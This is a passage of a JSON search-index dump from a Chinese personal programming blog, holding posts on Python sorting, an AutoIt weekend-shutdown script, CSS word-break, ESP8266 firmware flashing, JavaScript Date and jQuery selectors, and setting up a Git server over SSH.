class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">data</span>:</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, _id, _value)</span>:</span></span><br><span class=\"line\">            self.id    = _id</span><br><span class=\"line\">            self.value = _value</span><br><span class=\"line\">    c = [ data(<span class=\"number\">0</span>,<span class=\"number\">9</span>), data(<span class=\"number\">1</span>,<span class=\"number\">100</span>), data(<span class=\"number\">5</span>,<span class=\"number\">99</span>), data(<span class=\"number\">3</span>,<span class=\"number\">19</span>), data(<span class=\"number\">2</span>,<span class=\"number\">59</span>) ]</span><br><span class=\"line\">    c.sort(key=<span class=\"keyword\">lambda</span> x:x.id)<span class=\"comment\">#針對class member id 做sort</span></span><br><span class=\"line\">    c.sort(key=<span class=\"keyword\">lambda</span> x:x.value)<span class=\"comment\">#針對class member value 做sort</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#以下用cmp，可以達到上面指定key的效果</span></span><br><span class=\"line\">    c.sort(cmp=<span class=\"keyword\">lambda</span> x,y: cmp(x.id, y.id) )</span><br><span class=\"line\">    c.sort(cmp=<span class=\"keyword\">lambda</span> x,y: cmp(x.value, y.value))</span><br></pre></td></tr></table></figure>\n<p>資料來源：<a href=\"http://www.dotblogs.com.tw/rickyteng/archive/2011/12/29/63734.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/rickyteng/archive/2011/12/29/63734.aspx</a></p>\n","categories":["Python"]},{"title":"[Autoit]詢問禮拜六日自動關機腳本","url":"/blog/2015/06/22/logdown/2015-06-22-autoit-asked-the-week-6th-automated-shutdown-script/","content":"<p>就公文開啟腳本加上禮拜六日自動關機程式，不要浪費學校的電<br>然後怕卡在國定假日要來上課，所以寫出這個角本<br>自動開機就在BIOS設定，就搞定了XD</p>\n<figure class=\"highlight vb\"><figcaption><span>xxx.au3</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#include &lt;Date.au3&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Func OpenProc()</span><br><span class=\"line\">   <span class=\"meta\">#Working code</span></span><br><span class=\"line\"></span><br><span class=\"line\">EndFunc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">If</span> @WDAY==<span class=\"number\">1</span> <span class=\"keyword\">or</span> @WDAY == <span class=\"number\">7</span> <span class=\"keyword\">Then</span></span><br><span class=\"line\">   run(<span class=\"string\">\"shutdown -s -f -t 600\"</span>)</span><br><span class=\"line\">   sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\">   $goSutdown = MsgBox($MB_OKCANCEL,@WDAY,<span class=\"string\">\"今天是周休假日，程式自動執行關機，請問你是否繼續執行關機？\"</span>)</span><br><span class=\"line\">   <span class=\"keyword\">If</span> $goSutdown = $IDCANCEL <span class=\"keyword\">Then</span></span><br><span class=\"line\">\t  run(<span class=\"string\">\"shutdown -a\"</span>)</span><br><span class=\"line\">\t  OpenProc()</span><br><span class=\"line\">   EndIf</span><br><span class=\"line\">   <span class=\"keyword\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">EndIf</span><br><span class=\"line\"></span><br><span class=\"line\">OpenProc()</span><br></pre></td></tr></table></figure>","categories":["AutoIt"],"tags":["自動化","AutoIt"]},{"title":"[Python]Conditional expressions和Generator expressions","url":"/blog/2015/05/04/logdown/2015-05-04-python-conditional-expressions-and-generator-expressions/","content":"<p>之前網路上看到if 和for一行寫法<br>今天Google找了一下，發現找不到東西<br>KeyWord:if for one line | if for one statement</p>\n<p>最後在Python3文件找到<a href=\"https://docs.python.org/3/reference/expressions.html\" target=\"_blank\" rel=\"noopener\">Expressions</a><br><a id=\"more\"></a></p>\n<p>Conditional Expressions有點像ternary operator<br><code>print(&quot;True&quot; if True else False</code>)</p>\n<p>以前常見的ternary operator<br><code>echo &quot;True&quot; ? True:False</code></p>\n<hr>\n<p>Generator expressions</p>\n","categories":["Python"]},{"title":"[CSS]文字換行的問題","url":"/blog/2016/06/19/logdown/2016-06-19-css-word-wrap-problems/","content":"<p>由於最近做一個報表系統，在測試環境下沒有很長的資料，報表表格都沒有什麼問題<br>但在正試環境，很多文字就有自動換行的問題，然後爬了文但不清楚這些東西<br>花了一個下午時間理解這些東西，順便記一下筆記，不然很久沒用應該就忘掉了 囧</p>\n<p>word-break:normal|break-all|keep-all;<br>word-wrap:normal|break-word</p>\n<p>上面都是解決換行的問題(但不是真的換行)</p>\n<h2 id=\"word-break-Normal\"><a href=\"#word-break-Normal\" class=\"headerlink\" title=\"word-break:Normal\"></a>word-break:Normal</h2><div style=\"border: 1px solid ; width:100px;height:200px;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br></div><br>一般 word-break,word-wrap;都是normal<br>這些是截斷英文單字有關係，不是指整行是否段行<br><br><em>normal下一句有單字超過邊距會把整個單字換下一行</em><br><br>word-break:keep-all;<br>———————–<br><div style=\"border: 1px solid ; width:100px;height:200px;word-break:keep-all;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br></div>\n\n<p>恩，結果好像跟Normal模式一樣，沒什麼差別…，但這樣就特錯大錯<br>查了一下文件如下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">normal</span><br><span class=\"line\">    Use the default line break rule.</span><br><span class=\"line\">break-all</span><br><span class=\"line\">    Word breaks may be inserted between any character for non-CJK (Chinese/Japanese/Korean) text.</span><br><span class=\"line\">keep-all</span><br><span class=\"line\">    Don&apos;t allow word breaks for CJK text. Non-CJK text behavior is the same as for normal.</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://devdocs.io/css/word-break\" target=\"_blank\" rel=\"noopener\">http://devdocs.io/css/word-break</a></p>\n<p>官網下面範例就很清楚<code>keep-all</code>英文下還是以<code>normal</code>，但非英文(中文、日文…)不會換行<br>這邊我把他想像成   會把一串中文變成一整個單字，所以換行</p>\n<div style=\"border: 1px solid ; width:100px;height:300px;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br>此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.<br></div><br>一般 word-break,word-wrap;都是<code>normal</code><br>這些是截斷英文單字有關係，不是指整行是否段行<br>word-break:keep-all;<br><div style=\"border: 1px solid ; width:100px;height:300px;word-break:keep-all;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br>此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.<br></div>\n\n<p><strong>剛發現中文與中文之間有空白還是會做換行動作</strong></p>\n<p>好了，接下來要講word-break:break-all;</p>\n<h2 id=\"word-break-break-all\"><a href=\"#word-break-break-all\" class=\"headerlink\" title=\"word-break:break-all\"></a>word-break:break-all</h2><div style=\"border: 1px solid ; width:100px;height:300px;word-break:break-all;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br>此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.<br></div><br>以下結果我們看出英文超出單字不會自動換行<br><br><br>white-space:nowrap;<br>一段不會換行的問題<br><br><div style=\"white-space:nowrap;\"><br>I am bone of my code. I am bone of my code. I am bone of my code.  I am bone of my codecodecodecodecode.<br>此身為碼而生. 此身為碼而生. 此身為碼而生. 此身為碼碼碼碼而生.<br></div>\n\n<p>我的table不會亂用<code>word-break:keep-all;</code>或<code>white-space:nowrap;</code>可以解決問題</p>\n<p>測試還發現<code>display:block</code>裡面文字超出去<br>但是外框大小不會跟著文字延伸<br><code>display:inline-block</code>就沒有這個問題<br>上面的div文字會超出去邊框，但table沒有這個問題<br>看來有空要搞清楚這些….</p>\n","categories":["CSS"],"tags":["word-break","word-wrap"]},{"title":"[Arduino]新手用 Wifi 晶片 ESP8266 和 USB TTL Serial(PL2303)接上PC","url":"/blog/2016/06/24/logdown/2016-06-24-arduino-new-esp8266-and-usb-wifi-chip-ttl-serial-pl2303-connected-to-pc/","content":"<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/bsmdGiIZTWm0zhuttVIV_thumb.jpg\" alt=\"thumb.jpg\"><br>最近同事揪來 <del>玩</del> 學Arduino<br>由於之前忘記採購到WIFI模組<br>同事最近燒壞了WIFI模組(好像接到5v線)<br>最近借我了ESP8266和PL2303，叫我好好的玩<br><del>那我就大力的玩下去</del><br>當然我就簡單找網路上實作<br><a id=\"more\"></a></p>\n<p>前面參考<a href=\"http://lolwarden.pixnet.net/blog/post/82031214\" target=\"_blank\" rel=\"noopener\"><em>教學</em>Arduino WIFI(ESP8266) 初次上手應用</a></p>\n<p>一開始接wifi接到TTL真的不習慣，好不容易照上面教學做完<br>花了一些時間，接上電腦上面…竟然找不到驅動<br><del>這之前我完全不知道那個USB是TTL又花了一些時間  囧</del><br>中間還滿想衝Webduino就不會有這些問題<br>有興趣的可以看一下這個<a href=\"https://www.youtube.com/watch?v=P2V2d4aDP8w\" target=\"_blank\" rel=\"noopener\">Marty x Will @ 前端工程師的逆襲：使用 Web 技術玩轉 Arduino 開發版 </a><br>用win7搜尋TTL驅動<a href=\"http://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225&amp;pcid=41\" target=\"_blank\" rel=\"noopener\">PL2303</a><br>驅動程式就看到</p>\n<p>接下來就繼續<a href=\"http://lolwarden.pixnet.net/blog/post/82031214\" target=\"_blank\" rel=\"noopener\"><em>教學</em>Arduino WIFI(ESP8266) 初次上手應用</a> Realterm(終端機)</p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/zIGKuSYTYyeon44pTLyv_2016-06-25_171933.png\" alt=\"2016-06-25_171933.png\"></p>\n<p>CH_PD和VCC連在一起要接3v，不然接到5v會有燒掉的風險</p>\n<p>照上面教學還是連不到，我就以為接錯線….<br>馬上又重看才發現TXD<--->RXD要對接<br>所以就重新拔掉重接線</---></p>\n<p>接線發現TTL變白燈(事後才發現這好像才是插錯線)<br>我<del>興奮啦</del> 感覺這次亮白燈應該就接對線了</p>\n<p>但還是試了很久還是失敗orz   最後發現wifi沒有亮<br>我還以為是esp8266燒壞了  囧</p>\n<p>最終爬掉在重接，TTL亮紅燈 wifi也有亮燈<br>就可以用了</p>\n<p><a href=\"http://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html\" target=\"_blank\" rel=\"noopener\">如何燒錄 ESP8266 無線模組的韌體</a><br><a href=\"http://yhhuang1966.blogspot.tw/2015/08/esp8266.html\" target=\"_blank\" rel=\"noopener\">ESP8266 更新韌體 </a><br>才發現GPIO要接GNP才能進入燒寫模式(一直以為就跟手機刷機一樣XD)<br>還要燒四次<br>置於他說要額外接上電源，這樣電力才會夠<br>但我是用筆電就可以燒入成功</p>\n<p>在網路爬文後，需要更新ESP8266韌體才能玩Arduino<br><a href=\"https://www.youtube.com/watch?v=bq71JX25DGg\" target=\"_blank\" rel=\"noopener\">ESP8266 firmware 燒寫介紹 </a></p>\n<p>從上面官網可以看到<a href=\"http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM\" target=\"_blank\" rel=\"noopener\">ESP8266Flasher.exe</a>軟體<br>燒韌體還是失敗</p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/rkkryLTbKKDr3j3vTADS_2016-06-25_173420.png\" alt=\"2016-06-25_173420.png\"><br>還要抓四個韌體更新<a href=\"http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM\" target=\"_blank\" rel=\"noopener\">也在這個網站裡的Google Driver</a><br>照著Google Driver文件設定為8MB<br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/tdf9BsPRkKJtedCuRMsA_2016-06-25_173906.png\" alt=\"2016-06-25_173906.png\"><br>在設定Config <strong>4個設定檔(其中一個一樣) 和 address</strong><br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/d8NBaxCfTzSNZLtEj6ls_2016-06-25_173837.png\" alt=\"2016-06-25_173837.png\"><br>點Flash進行燒入，燒入的過程中看到有MAC就表示有成功<br>再設定Config把第一個關掉<br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/67UV2S53S96vSgIEytjZ_2016-06-25_173929.png\" alt=\"2016-06-25_173929.png\"><br>再回去點Flash(重覆4次)就完成</p>\n<p>開啟Realterm 鮑率打9600<br>最後要打<code>115200</code><br>網路查了一下，舊版好像是9600，新版才是115200<br>要更新韌體才能用Arduino<br>但要手動改9600才能用<br>拍一下要設定的地方</p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/wnVWEXwTSnuqTURcWrcw_2016-06-25_174508.png\" alt=\"2016-06-25_174508.png\"><br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/hhYoQutSTR2fZBIl2FnY_2016-06-25_174737.png\" alt=\"2016-06-25_174737.png\"><br>OPEN是點掉再按下去<br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/mstYMzMTDWXz7ACw4C2l_2016-06-25_175119.png\" alt=\"2016-06-25_175119.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">AT</span><br><span class=\"line\"></span><br><span class=\"line\">OK</span><br></pre></td></tr></table></figure>\n<p>感動</p>\n<p>最後發現我常用的pietty也能連<br>打指令要用<code>Enter</code>後再按<code>Ctrl+J</code><br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/745009/PYJ2giwpTJu2hWAUUqLY_2016-06-25_175914.png\" alt=\"2016-06-25_175914.png\"><br>好像這個比較方便耶XD</p>\n<p>下次用用Arduino連ESP8266</p>\n<p>參考來源：<br><a href=\"http://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html\" target=\"_blank\" rel=\"noopener\">http://ruten-proteus.blogspot.tw/2014/12/esp8266-firmware-burning.html</a><br><a href=\"http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html\" target=\"_blank\" rel=\"noopener\">http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html</a><br><a href=\"https://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/\" target=\"_blank\" rel=\"noopener\">https://mlwmlw.org/2015/07/%E6%B7%B1%E5%85%A5%E6%B7%BA%E5%87%BA-wifi-%E6%99%B6%E7%89%87-esp8266-with-arduino/</a><br><a href=\"https://www.youtube.com/watch?v=bq71JX25DGg\" target=\"_blank\" rel=\"noopener\">https://www.youtube.com/watch?v=bq71JX25DGg</a><br><a href=\"http://ruten-proteus.blogspot.tw/2014/12/esp8266-at-command.html\" target=\"_blank\" rel=\"noopener\">http://ruten-proteus.blogspot.tw/2014/12/esp8266-at-command.html</a><br><a href=\"http://flower-platform.com/2015/12/16/esp8266-with-at-commands-connect-from-pc-with-putty/\" target=\"_blank\" rel=\"noopener\">http://flower-platform.com/2015/12/16/esp8266-with-at-commands-connect-from-pc-with-putty/</a><br><a href=\"http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html\" target=\"_blank\" rel=\"noopener\">http://lets-make-games.blogspot.tw/2015/04/wifi-esp8266-wifi.html</a><br><a href=\"http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM\" target=\"_blank\" rel=\"noopener\">http://code.unumobile.com/wf8266r/tutorials/esp8266/00_FM</a><br><a href=\"http://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225&amp;pcid=41\" target=\"_blank\" rel=\"noopener\">http://www.prolific.com.tw/US/ShowProduct.aspx?p_id=225&amp;pcid=41</a><br><a href=\"https://docs.google.com/viewer?a=v&amp;pid=sites&amp;srcid=a3N2cy5raC5lZHUudHd8dGpofGd4OjFiNWM2NGJjMjA4NmZlZjA\" target=\"_blank\" rel=\"noopener\">https://docs.google.com/viewer?a=v&amp;pid=sites&amp;srcid=a3N2cy5raC5lZHUudHd8dGpofGd4OjFiNWM2NGJjMjA4NmZlZjA</a><br><a href=\"https://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Release\" target=\"_blank\" rel=\"noopener\">https://github.com/nodemcu/nodemcu-flasher/tree/master/Win64/Release</a><br><a href=\"http://yhhuang1966.blogspot.tw/2015/08/esp8266.html\" target=\"_blank\" rel=\"noopener\">http://yhhuang1966.blogspot.tw/2015/08/esp8266.html</a></p>\n","categories":["Arduino"],"tags":["Arduino"]},{"title":"[JavaScript] Date物件  小筆記","url":"/blog/2016/06/12/logdown/2016-06-12-javascript-simple-date-object-record/","content":"<p>最近有使用JavaScript Date物件，想說有什麼辦法直接把變數換成當月最後一天<br>發現網路上有一個教法寫<br><figure class=\"highlight javascript\"><figcaption><span>javascript</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">date.setMonth(date.getMonth+<span class=\"number\">1</span>);</span><br><span class=\"line\">date.setDate(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(date);</span><br></pre></td></tr></table></figure></p>\n<p>非常神奇，簡單又不需要判斷閏年的問題!!!!<br><a id=\"more\"></a></p>\n<p>由於同學最近問我有沒有辦法固定網頁的時間先自動調整<br>我就簡單看一下，在瀏覽器的GreaseMonkey的腳本來寫JavaScript<br>就用了一下Date物件<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> input = jQuery(<span class=\"string\">'&lt;input value=\"06\"&gt;'</span>).change(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> inputMonth = jQuery(<span class=\"keyword\">this</span>).val();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(inputMonth.length == <span class=\"number\">1</span>) inputMonth = <span class=\"string\">'0'</span>+ inputMonth;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> setDate = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(<span class=\"number\">2016</span>,inputMonth,<span class=\"number\">1</span>);</span><br><span class=\"line\">\tsetDate.setMonth(setDate.getMonth());</span><br><span class=\"line\">\tsetDate.setDate(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> day = setDate.getDate();</span><br><span class=\"line\"></span><br><span class=\"line\">\tjQuery(<span class=\"string\">'[name=**a**]'</span>).val(<span class=\"string\">'2016-'</span> + inputMonth + <span class=\"string\">'-01 00:00'</span>);</span><br><span class=\"line\">\tjQuery(<span class=\"string\">'[name=**b**]'</span>).val(<span class=\"string\">'2016-'</span> + inputMonth + <span class=\"string\">'-'</span> + day + <span class=\"string\">' 23:59'</span>);</span><br><span class=\"line\">&#125;).change();</span><br><span class=\"line\"></span><br><span class=\"line\">jQuery(<span class=\"string\">'#**a**'</span>).before(input);</span><br></pre></td></tr></table></figure></p>\n<p>順便也把他覺得麻煩的readonly拿掉了XD<br><del>他以後橫行無阻(誤)</del></p>\n<p>這個感覺還滿實用的，先簡單記個筆記<br>怕太久沒用就忘了XD</p>\n<p>為什麼setDate(0)是抓前一個月最後一天呢??<br>我有試著查看MDN的文件，但好像沒特別說setDate(0)<br>只看到setDate(32)會是下個月1日，然後又看不太懂ECMASCRIPT文件</p>\n<p>最後有在w3cschool看到<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Required. An integer representing the day of a month.</span><br><span class=\"line\"></span><br><span class=\"line\">Expected values are 1-31, but other values are allowed:</span><br><span class=\"line\"></span><br><span class=\"line\">    0 will result in the last day of the previous month</span><br><span class=\"line\">    -1 will result in the day before the last day of the previous month</span><br><span class=\"line\"></span><br><span class=\"line\">If the month has 31 days:</span><br><span class=\"line\"></span><br><span class=\"line\">    32 will result in the first day of the next month</span><br><span class=\"line\"></span><br><span class=\"line\">If the month has 30 days:</span><br><span class=\"line\"></span><br><span class=\"line\">    32 will result in the second day of the next month</span><br></pre></td></tr></table></figure></p>\n<p>比較注意的是呼叫date物件<code>new Date(year,month-1,day)</code>，一月month參數為<code>0</code></p>\n<p>參考來源：<br><a href=\"http://www.w3schools.com/jsref/jsref_setdate.asp\" target=\"_blank\" rel=\"noopener\">http://www.w3schools.com/jsref/jsref_setdate.asp</a><br><a href=\"http://www.eion.com.tw/Blogger/?Pid=1148\" target=\"_blank\" rel=\"noopener\">http://www.eion.com.tw/Blogger/?Pid=1148</a></p>\n<p>看到有趣應用<br><a href=\"http://stackoverflow.com/questions/13745742/setdate-to-the-date-whose-day-is-zero-that-is-sunday\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/13745742/setdate-to-the-date-whose-day-is-zero-that-is-sunday</a><br><a href=\"http://jsfiddle.net/phZr7/1/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/phZr7/1/</a></p>\n","categories":["JavaScript"],"tags":["JavaScript","Date"]},{"title":"[jQuery] :first 和:first-child 不一樣","url":"/blog/2016/06/25/logdown/2016-06-25-css-first-and-first-child-not-the-same/","content":"<p>由於同事有用我寫的JavaScript做tr跳頁監聽事件<br>由於第一欄是input radio不需做跳頁<br>我就簡單寫了<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'table tr'</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    location.href=<span class=\"string\">'xxxxxx'</span>;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">'table tr:first-child'</span>).off(<span class=\"string\">'click'</span>);</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>同事問我怎麼不用:first，怎麼使用<code>:first-child</code><br>他說他改效果一樣<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(&apos;table tr:first&apos;).off(&apos;click&apos;);</span><br></pre></td></tr></table></figure></p>\n<p><del>瞬間被考倒</del> 我忘了他們的差別<br>當然馬上Google腦補一下<br>才發現他們不一樣….</p>\n<p>:first只會select第一個<br>:first-child只會select每個父層的第一個子元素</p>\n<p><code>:first-child</code>等於<code>:nth-child(1)</code></p>\n<p>還有<code>:first-of-type</code>和<code>:nth-of-type(1)</code>還是有差<br>還有<code>:nth-last-child(n)</code><br>有空在記一下筆記</p>\n<p>備注:CSS沒有<code>:first</code></p>\n","categories":["JQuery"]},{"title":"線上網頁編輯器","url":"/blog/2016/06/29/logdown/2016-06-29-online-web-page-editor/","content":"<p><a href=\"http://plnkr.co/\" target=\"_blank\" rel=\"noopener\">http://plnkr.co/</a><br><a href=\"http://codepen.io/\" target=\"_blank\" rel=\"noopener\">http://codepen.io/</a><br><a href=\"http://jsbin.com/\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/</a><br><a href=\"http://jsfiddle.net/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/</a><br><a href=\"http://codemagic.gr/\" target=\"_blank\" rel=\"noopener\">http://codemagic.gr/</a><br><a href=\"http://www.cssdesk.com/\" target=\"_blank\" rel=\"noopener\">http://www.cssdesk.com/</a><br><a href=\"http://dabblet.com/\" target=\"_blank\" rel=\"noopener\">http://dabblet.com/</a><br><a href=\"http://liveweave.com/\" target=\"_blank\" rel=\"noopener\">http://liveweave.com/</a></p>\n","categories":["網站記錄"]},{"title":"我的Sublime Text 3套件分享","url":"/blog/2016/08/23/logdown/2016-08-23-801285/","content":"<p>List</p>\n<ul>\n<li>AdvancedNewFile (新增檔案用)</li>\n<li>Alignment       (對齊用)</li>\n<li>All Autocomplete  (自動載入別的開的檔案tip)</li>\n<li>Bootstrap 3 Snippets</li>\n<li>BracketHighlighter  (提示/修改/移除外框符號，算還實用)</li>\n<li>ConvertToUTF8       (還沒utf-8專案用)</li>\n<li>DocBlocker          (註解用)</li>\n<li>Emmet               (html專用)</li>\n<li>IMESupport           (中文輸入法專用)</li>\n<li>jQuery</li>\n<li>PHP-Twig</li>\n<li>Pretty JSON          (你的json會變很好看)</li>\n<li>SqlBeautifier        (你的sql會變的很好看XD)</li>\n<li>StringEncode         (html轉一些符號，很實用)</li>\n<li>Text Pastry          (1 to x ，懶人專用，我很愛)</li>\n</ul>\n","categories":["實用工具"]},{"title":"在Linux架Git Server(ssh)","url":"/blog/2016/08/23/logdown/2016-08-23-in-linux-git-server-ssh/","content":"<p>最近公司接了一個案子，我被分配到架設Git Server工作<br>架設成功，就在這裡做簡單的筆記。<br>由於網路教的都大同小異，只需理解為什麼這樣做<br>用自己的需求，基本上實作應該都能做出來</p>\n<a id=\"more\"></a>\n<p>首先，先建立git帳號</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">adduser git</span><br></pre></td></tr></table></figure>\n<p>然後，Git Server說穿了就是用ssh方式做存取<br>所以必需用RSA金鑰登入(不需打密碼這種)，多虧了這次我終於了解ssh金鑰登入方式<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure></p>\n<p>家目錄就會產生了.ssh資料夾<br>裡面有id_rsa.pub id_rsa兩個檔案(前者是公開金鑰[給Server]、後者是私密金鑰[Clinet自己保留])</p>\n<p>在Server的git家目錄把.ssh\\authorized_keys加入公開金鑰<br>或 上傳公開金鑰直接用指令加入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat /tmp/id_rsa.john.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n<p><strong>注意：.ssh資料夾必需要為700，authorized_keys必需為600或root owner</strong></p>\n<p>此時可以進行ssh登入嘗式，能登入git帳號成功，就差不多了。</p>\n<p>在家目錄建立<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir xxx.git</span><br><span class=\"line\">cd xxx.git</span><br><span class=\"line\">git --bare init</span><br></pre></td></tr></table></figure></p>\n<p>好了，接下來就做commit上去試試<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cd myproject</span><br><span class=\"line\">$ git init</span><br><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m &apos;initial commit&apos;</span><br><span class=\"line\">$ git remote add origin git@xxx.xxx.xxx.xx:xxx.git</span><br><span class=\"line\">$ git push origin master</span><br></pre></td></tr></table></figure></p>\n<p>完畢。</p>\n<p>什麼，你說還沒完XD，由於安全性的問題<br>git應該不該登入帳號<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/passwd</span><br><span class=\"line\">git:x:1000:1000::/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>\n<p>好了這樣就完成了。</p>\n<p>你說還有https、Gitosis和GitLab<br>各位勇者就靠你們研究嘍XD</p>\n<p>在這次實作，我發現可以用scp指令傳檔案上去<br>pietty 0.3可以傳(拖移檔案)，以後傳檔案不用在開ftp了(淚)</p>\n<p>參考來源：<br>伺服器上的 Git - 架設伺服器<br><a href=\"https://git-scm.com/book/zh-tw/v1/%E4%BC%BA%E6%9C%8D%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%A8%AD%E4%BC%BA%E6%9C%8D%E5%99%A8\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/book/zh-tw/v1/%E4%BC%BA%E6%9C%8D%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%A8%AD%E4%BC%BA%E6%9C%8D%E5%99%A8</a><br>在 Linux 中架設 Git 伺服器教學（使用 SSH 加密傳輸）<br><a href=\"https://blog.gtwang.org/linux/linux-git-server-using-ssh/\" target=\"_blank\" rel=\"noopener\">https://blog.gtwang.org/linux/linux-git-server-using-ssh/</a><br>給windows使用者的簡易Git環境架設 (linux架設)<br><a href=\"http://eric0806.blogspot.tw/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html\" target=\"_blank\" rel=\"noopener\">http://eric0806.blogspot.tw/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html</a><br>Ubuntu架設GitServer<br><a href=\"http://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver\" target=\"_blank\" rel=\"noopener\">http://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver</a><br>CentOS架設GitServer<br><a href=\"http://samchu.logdown.com/posts/778052-set-up-centos-gitserver\" target=\"_blank\" rel=\"noopener\">http://samchu.logdown.com/posts/778052-set-up-centos-gitserver</a><br>Fedora, CentOS ssh 登入到遠端 Server 不用密碼<br><a href=\"http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC\" target=\"_blank\" rel=\"noopener\">http://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"好用的剪貼簿","url":"/blog/2016/09/11/logdown/2016-09-11-863647/","content":"<p>最近公司專案是用西班牙語<br>所以要一直參考文件貼到別的地方<br>一直複製 → 貼上  →複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上…  <del>無限迴圈</del><br>之前一些都靠Sublime 